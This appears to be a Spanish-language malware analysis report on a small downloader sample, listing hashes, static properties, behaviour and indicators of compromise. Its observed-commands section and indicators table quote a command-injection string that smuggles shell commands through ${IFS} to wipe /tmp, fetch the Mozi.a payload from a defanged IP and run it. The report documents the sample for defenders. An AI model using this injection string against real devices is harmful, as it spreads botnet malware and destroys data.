# 🧬 Payload Analysis

`bf9be8dc03ae3dcdc077d3b57b51d26d915d78cbbeee05cb5c4b50456474344c`

## 📌 Resumen

Texto ASCII de 162 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Mozi.a` en `hxxp://175.107.205.XXX:34468/Mozi.a`. Se dispone de 1 comando observado o extraído. Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/bf9be8dc03ae3dcdc077d3b57b51d26d915d78cbbeee05cb5c4b50456474344c.md](../../../../../malware-like/oraculo/downloader/bf9be8dc03ae3dcdc077d3b57b51d26d915d78cbbeee05cb5c4b50456474344c.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:00:22.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `bf9be8dc03ae3dcdc077d3b57b51d26d915d78cbbeee05cb5c4b50456474344c`
- **SHA1:** `aed5ffd4a810fc24ff4605b122ef979014faffb3`
- **MD5:** `f64b3988c55dae4200892513dd014d8e`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 162 B |
| Entropía | 5.35 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}hxxp://175.107.205.XXX:34468/Mozi.a;sh${IFS}/tmp/M
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://175.107.205.XXX:34468/Mozi.a;sh$ | strings |
| ip | 175.107.205.XXX | static_analysis |
| command | GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}hxxp://175.107.205.XXX:34468/Mozi.a;sh${IFS}/tmp/M | strings |
| hash | bf9be8dc03ae3dcdc077d3b57b51d26d915d78cbbeee05cb5c4b50456474344c | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
